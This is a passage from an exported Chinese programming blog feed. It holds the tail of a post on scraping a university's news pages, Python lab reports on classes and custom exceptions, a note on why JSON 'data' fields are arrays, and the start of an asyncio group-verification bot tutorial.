class="subst">&#123;i&#125;</span> 页&quot;</span>)</span><br><span class="line">        news = scrape_news(<span class="string">f&quot;https://www.qfnu.edu.cn/news/xxyw/<span class="subst">&#123;i&#125;</span>.htm&quot;</span>)</span><br><span class="line">        save_to_txt(news, <span class="string">f&quot;news_<span class="subst">&#123;i&#125;</span>.txt&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="实现截图"><a href="#实现截图" class="headerlink" title="实现截图"></a>实现截图</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-a63a76b8e5698fefb5b966cf7bc54598.png"
                      alt="img"
                ></p>
<p>可以看到七百多页全爬完了，大约用了几分钟</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-370198b0ab7a10f1a912259d4091df7d.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-5ee870e74b65fd0a23a07bf4aabc3b08.png"
                      alt="img"
                ></p>
<p>随便点开几个看看</p>
<p>我是以一页为一个单位爬的，如果要用的话，直接 Python 脚本合并起来即可</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实验八——面向对象编程</title>
    <url>/posts/44cb2a.html</url>
    <content><![CDATA[<h2 id="创建类计算数学"><a href="#创建类计算数学" class="headerlink" title="创建类计算数学"></a>创建类计算数学</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMath</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, radius</span>):</span><br><span class="line">        <span class="variable language_">self</span>.radius = radius</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">circle_perimeter</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 计算圆的周长</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">round</span>(<span class="number">2</span> * math.pi * <span class="variable language_">self</span>.radius, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">circle_area</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 计算圆的面积</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">round</span>(math.pi * <span class="variable language_">self</span>.radius**<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sphere_surface_area</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 计算球的表面积</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">round</span>(<span class="number">4</span> * math.pi * <span class="variable language_">self</span>.radius**<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sphere_volume</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 计算球的体积</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">round</span>((<span class="number">4</span> / <span class="number">3</span>) * math.pi * <span class="variable language_">self</span>.radius**<span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试代码</span></span><br><span class="line">radius = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入半径：&quot;</span>))</span><br><span class="line">mymath = MyMath(radius)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;圆的周长:&quot;</span>, mymath.circle_perimeter())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;圆的面积:&quot;</span>, mymath.circle_area())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;球的表面积:&quot;</span>, mymath.sphere_surface_area())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;球的体积:&quot;</span>, mymath.sphere_volume())</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h4><ul>
<li><p><strong>类定义</strong>：<code>class MyMath:</code> 定义了一个名为 <code>MyMath</code> 的类，表示几何计算的数学工具。</p>
</li>
<li><p>**初始化方法 <code>__init__</code>**：</p>
<ul>
<li>接收一个参数 <code>radius</code>（半径）。</li>
<li>使用 <code>self.radius = radius</code> 将传入的 <code>radius</code> 参数绑定到实例属性 <code>radius</code> 上，供后续方法调用。</li>
<li>这样，每个 <code>MyMath</code> 对象都可以基于特定的半径进行计算。</li>
</ul>
</li>
</ul>
<h4 id="使用示例："><a href="#使用示例：" class="headerlink" title="使用示例："></a>使用示例：</h4><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">circle = MyMath(radius=<span class="number">5</span>)  <span class="comment"># 创建一个半径为 5 的实例</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-eae906061079076f1cddba1f1330215b.png"
                      alt="img"
                ></p>
<h2 id="摄氏温度华氏温度转换"><a href="#摄氏温度华氏温度转换" class="headerlink" title="摄氏温度华氏温度转换"></a>摄氏温度华氏温度转换</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Temperature</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, temperature</span>):</span><br><span class="line">        <span class="variable language_">self</span>.temperature = temperature</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ToFahrenheit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">round</span>((<span class="variable language_">self</span>.temperature * <span class="number">1.8</span>) + <span class="number">32</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ToCelsius</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">round</span>((<span class="variable language_">self</span>.temperature - <span class="number">32</span>) / <span class="number">1.8</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入摄氏温度并转换为华氏温度</span></span><br><span class="line">celsius = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入摄氏温度：&quot;</span>))</span><br><span class="line">temperature = Temperature(celsius)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;摄氏温度 = <span class="subst">&#123;celsius&#125;</span>，华氏温度 = <span class="subst">&#123;temperature.ToFahrenheit()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入华氏温度并转换为摄氏温度</span></span><br><span class="line">fahrenheit = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入华氏温度：&quot;</span>))</span><br><span class="line">temperature = Temperature(fahrenheit)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;华氏温度 = <span class="subst">&#123;fahrenheit&#125;</span>，摄氏温度 = <span class="subst">&#123;temperature.ToCelsius()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>不多解释了，和上面一样。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-e115c40defe4d7b00335ad2bedd6e63e.png"
                      alt="img"
                ></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实验报告——13周习题课</title>
    <url>/posts/5060bab6.html</url>
    <content><![CDATA[<h2 id="第一题，计算圆和矩形"><a href="#第一题，计算圆和矩形" class="headerlink" title="第一题，计算圆和矩形"></a>第一题，计算圆和矩形</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dimension</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="variable language_">self</span>.x = x</span><br><span class="line">        <span class="variable language_">self</span>.y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">area</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">draw</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span>(<span class="title class_ inherited__">Dimension</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y, radius</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(x, y)</span><br><span class="line">        <span class="variable language_">self</span>.radius = radius</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">area</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> math.pi * <span class="variable language_">self</span>.radius**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">draw</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span>  <span class="comment"># 不需要画圆</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span>(<span class="title class_ inherited__">Dimension</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y, length, width</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(x, y)</span><br><span class="line">        <span class="variable language_">self</span>.length = length</span><br><span class="line">        <span class="variable language_">self</span>.width = width</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">area</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.length * <span class="variable language_">self</span>.width</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">draw</span>(<span class="params">self</span>):</span><br><span class="line">        turtle.penup()</span><br><span class="line">        turtle.goto(<span class="variable language_">self</span>.x - <span class="variable language_">self</span>.length / <span class="number">2</span>, <span class="variable language_">self</span>.y - <span class="variable language_">self</span>.width / <span class="number">2</span>)</span><br><span class="line">        turtle.pendown()</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            turtle.forward(<span class="variable language_">self</span>.length)</span><br><span class="line">            turtle.left(<span class="number">90</span>)</span><br><span class="line">            turtle.forward(<span class="variable language_">self</span>.width)</span><br><span class="line">            turtle.left(<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试代码</span></span><br><span class="line">circle = Circle(<span class="number">0</span>, <span class="number">0</span>, <span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;圆的半径为<span class="subst">&#123;circle.radius&#125;</span>圆的面积为<span class="subst">&#123;circle.area()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">rectangle = Rectangle(<span class="number">0</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">40</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;矩形的长为<span class="subst">&#123;rectangle.length&#125;</span>，宽为<span class="subst">&#123;rectangle.width&#125;</span>，面积为<span class="subst">&#123;rectangle.area()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制矩形</span></span><br><span class="line">turtle.speed(<span class="number">1</span>)</span><br><span class="line">rectangle.draw()</span><br><span class="line">turtle.done()</span><br></pre></td></tr></table></figure></div>

<h2 id="第二题，Student-学生类"><a href="#第二题，Student-学生类" class="headerlink" title="第二题，Student 学生类"></a>第二题，Student 学生类</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="comment"># 类变量，用于存储下一个可用的 id</span></span><br><span class="line">    _next_id = <span class="number">1001</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, score</span>):</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">id</span> = <span class="literal">None</span>  <span class="comment"># id 在 prod_id 方法中分配</span></span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.score = score</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">prod_id</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 分配 id 并自增</span></span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">id</span> = Student._next_id</span><br><span class="line">        Student._next_id += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="comment"># 重载 + 运算符，返回两个学生成绩的和</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(other, Student):</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.score + other.score</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NotImplemented</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试代码</span></span><br><span class="line">p1 = Student(<span class="string">&quot;张三&quot;</span>, <span class="number">67</span>)</span><br><span class="line">p1.prod_id()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;0&#125;的id号&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(p1.name, p1.<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">p2 = Student(<span class="string">&quot;李四&quot;</span>, <span class="number">78</span>)</span><br><span class="line">p2.prod_id()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;0&#125;的id号&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(p2.name, p2.<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;0&#125;和&#123;1&#125;的成绩总和为：&#123;2&#125;&quot;</span>.<span class="built_in">format</span>(p1.name, p2.name, p1 + p2))</span><br><span class="line"></span><br><span class="line">p3 = Student(<span class="string">&quot;王五&quot;</span>, <span class="number">89</span>)</span><br><span class="line">p3.prod_id()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;王五的id号&quot;</span>, p3.<span class="built_in">id</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="第三题，模拟猜数游戏"><a href="#第三题，模拟猜数游戏" class="headerlink" title="第三题，模拟猜数游戏"></a>第三题，模拟猜数游戏</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成1到10之间的随机数</span></span><br><span class="line">target_number = random.randint(<span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最大尝试次数</span></span><br><span class="line">max_attempts = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_attempts + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 提示用户输入</span></span><br><span class="line">        guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">f&quot;第<span class="subst">&#123;attempt&#125;</span>次输入\n输入一个数: &quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断用户输入</span></span><br><span class="line">        <span class="keyword">if</span> guess &lt; <span class="number">1</span> <span class="keyword">or</span> guess &gt; <span class="number">10</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Must input an integer between 1 and 10&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> guess &gt; target_number:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Too big&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> guess &lt; target_number:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Too small&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Congratulations!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;The value is <span class="subst">&#123;target_number&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Must input an integer between 1 and 10&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Game over&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;The correct number was <span class="subst">&#123;target_number&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="第四题第五题，自定义一个异常类"><a href="#第四题第五题，自定义一个异常类" class="headerlink" title="第四题第五题，自定义一个异常类"></a>第四题第五题，自定义一个异常类</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AgeError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.age&#125;</span>, 年龄错误！应该在 18-60 之间&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_age</span>():</span><br><span class="line">    age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入一个年龄:&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> age &lt; <span class="number">18</span> <span class="keyword">or</span> age &gt; <span class="number">60</span>:</span><br><span class="line">        <span class="keyword">raise</span> AgeError(age)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正常的年龄：&quot;</span>, age)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    check_age()</span><br><span class="line"><span class="keyword">except</span> AgeError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure></div>

<h2 id="第六题，补全程序"><a href="#第六题，补全程序" class="headerlink" title="第六题，补全程序"></a>第六题，补全程序</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NumberError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data</span>):</span><br><span class="line">        Exception.__init__(<span class="variable language_">self</span>, data)</span><br><span class="line">        <span class="variable language_">self</span>.data = data  <span class="comment"># 【1】将传入的数据保存到实例变量中</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):  <span class="comment"># 重载__str__方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;NumberError: 非法数值 <span class="subst">&#123;self.data&#125;</span>&quot;</span>  <span class="comment"># 【2】返回错误提示信息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">total</span>(<span class="params">data</span>):</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> NumberError(i)  <span class="comment"># 【3】抛出自定义异常</span></span><br><span class="line">        total += i  <span class="comment"># 【4】累加合法的数值</span></span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试代码</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>(<span class="string">&quot;输入整数用逗号隔开: &quot;</span>).split(<span class="string">&quot;,&quot;</span>)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;总计=&quot;</span>, total(data))  <span class="comment"># 【5】调用total函数计算和</span></span><br><span class="line">    <span class="keyword">except</span> NumberError <span class="keyword">as</span> e:  <span class="comment"># 【6】捕获自定义异常</span></span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure></div>

<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><ol>
<li><p>Python 异常处理 try except else 的执行流程：</p>
<ul>
<li>try 块：包含可能产生异常的代码</li>
<li>except 块：当 try 块中发生异常时执行，可以捕获特定类型的异常</li>
<li>else 块：当 try 块中没有发生异常时执行</li>
<li>finally 块：无论是否发生异常都会执行的代码块</li>
</ul>
<p>执行顺序：</p>
<ul>
<li>正常情况：try → else → finally</li>
<li>异常情况：try → except → finally</li>
</ul>
</li>
<li><p>自定义异常如何抛出：</p>
<ul>
<li><p>通过创建继承自 Exception 类的自定义类来定义异常</p>
</li>
<li><p>使用 raise 关键字抛出异常</p>
</li>
<li><p>示例：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">raise</span> MyError(<span class="string">&quot;这是一个自定义错误&quot;</span>)</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p>实验中的问题总结：</p>
<ul>
<li>异常处理可以让程序更加健壮，避免因异常而崩溃</li>
<li>合理使用 try-except 可以优雅地处理错误情况</li>
<li>自定义异常可以更好地表达程序特定的错误情况</li>
<li>注意捕获具体的异常类型，避免使用过于宽泛的 except 语句</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python开发学习记录</title>
    <url>/posts/f30b492.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文持续记录 Python 学习中遇到的一些小知识点，难题等内容，包括但不仅限于 Python 开发、Python 爬虫、JSON、Web 等内容</p>
<p>本文包含部分 AI 补充的内容</p>
<h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="2025-年-2-月-8-日-JSON"><a href="#2025-年-2-月-8-日-JSON" class="headerlink" title="2025 年 2 月 8 日 JSON"></a>2025 年 2 月 8 日 JSON</h3><blockquote>
<p>抓包过程中发现了 JSON 的 data 键数据用数组包裹，但某些格式化工具无法解析</p>
</blockquote>
<p><code>data</code> 被放在数组中主要是为了处理数据的可扩展性和一致性。这种设计有几个原因：</p>
<ol>
<li><p><strong>可扩展性</strong>：</p>
<ul>
<li><p>如果以后接口需要返回多条数据（例如，多个课程），把 <code>data</code> 放在数组中可以确保数据结构的一致性。无论是返回单条数据还是多条数据，格式都能统一。</p>
</li>
<li><p>例如，如果返回课程列表时，</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">data</span><br></pre></td></tr></table></figure></div>

<p> 就可以包含多个课程的对象：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span> ...课程<span class="number">1.</span>.. <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span> ...课程<span class="number">2.</span>.. <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span> ...课程<span class="number">3.</span>.. <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p><strong>避免特殊情况</strong>：</p>
<ul>
<li>如果直接将 <code>data</code> 设为对象而不是数组，返回单条数据时就必须特殊处理，导致前端和后端的处理逻辑变得复杂。通过统一使用数组，即使只有一条数据，也能确保一致性，处理起来更简单。</li>
</ul>
</li>
<li><p><strong>符合 RESTful API 设计规范</strong>：</p>
<ul>
<li>在 RESTful 风格的 API 中，通常会使用数组来表示资源集合，即使只有一个资源，仍然放入数组中。这样做能够清晰表明数据是集合的一部分，符合数据结构的语义。</li>
</ul>
</li>
</ol>
<p>总结来说，<code>data</code> 使用数组包裹是为了保持接口的结构一致性和灵活性，尤其是在处理多条数据时。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Python异步编程实战：群聊验证系统的并发处理</title>
    <url>/posts/8687e59f.html</url>
    <content><![CDATA[<h1 id="Python-异步编程实战：群聊验证系统的并发处理"><a href="#Python-异步编程实战：群聊验证系统的并发处理" class="headerlink" title="Python 异步编程实战：群聊验证系统的并发处理"></a>Python 异步编程实战：群聊验证系统的并发处理</h1><blockquote>
<p>本文含有 AI 搜索生成内容，仅供参考</p>
</blockquote>
<p>本文以 <a class="link"   href="https://github.com/W1ndys/W1ndysBot-dev/tree/main/app/modules/GroupHumanVerification" >https://github.com/W1ndys/W1ndysBot-dev/tree/main/app/modules/GroupHumanVerification<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 为示例，实现一个群聊验证系统。</p>
<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在开发机器人或自动化系统时，我们经常需要处理多个群聊的并发操作。本文将介绍如何使用 Python 的异步编程特性来实现高效的群聊验证系统。</p>
<h2 id="1-异步编程基础"><a href="#1-异步编程基础" class="headerlink" title="1. 异步编程基础"></a>1. 异步编程基础</h2><h3 id="1-1-什么是异步编程？"><a href="#1-1-什么是异步编程？" class="headerlink" title="1.1 什么是异步编程？"></a>1.1 什么是异步编程？</h3><p>异步编程是一种编程范式，允许程序在等待 I&#x2F;O 操作（如网络请求）时执行其他任务，而不是被阻塞。在 Python 中，我们使用<code>async/await</code>语法来实现异步编程。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment"># 异步操作</span></span><br><span class="line">    <span class="keyword">await</span> some_async_operation()</span><br></pre></td></tr></table></figure></div>

<h3 id="1-2-协程（Coroutine）"><a href="#1-2-协程（Coroutine）" class="headerlink" title="1.2 协程（Coroutine）"></a>1.2 协程（Coroutine）</h3><p>协程是异步编程的基本单位，它可以在执行过程中暂停和恢复。与线程相比，协程更轻量级，更适合处理 I&#x2F;O 密集型任务。</p>
<h2 id="2-实现群聊验证系统"><a href="#2-实现群聊验证系统" class="headerlink" title="2. 实现群聊验证系统"></a>2. 实现群聊验证系统</h2><h3 id="2-1-基本结构"><a href="#2-1-基本结构" class="headerlink" title="2.1 基本结构"></a>2.1 基本结构</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GroupHumanVerificationHandler</span>:</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_scan_verification</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> DataManager() <span class="keyword">as</span> dm:</span><br><span class="line">                unverified_users = dm.get_all_unverified_users_with_code_and_warning()</span><br><span class="line">                result_msgs = []</span><br><span class="line">                <span class="keyword">if</span> unverified_users:</span><br><span class="line">                    tasks = []</span><br><span class="line">                    <span class="keyword">for</span> group_id, user_list <span class="keyword">in</span> unverified_users.items():</span><br><span class="line">                        task = asyncio.create_task(</span><br><span class="line">                            <span class="variable language_">self</span>._process_single_group(group_id, user_list, dm, result_msgs)</span><br><span class="line">                        )</span><br><span class="line">                        tasks.append(task)</span><br><span class="line">                    <span class="keyword">await</span> asyncio.gather(*tasks)</span><br></pre></td></tr></table></figure></div>

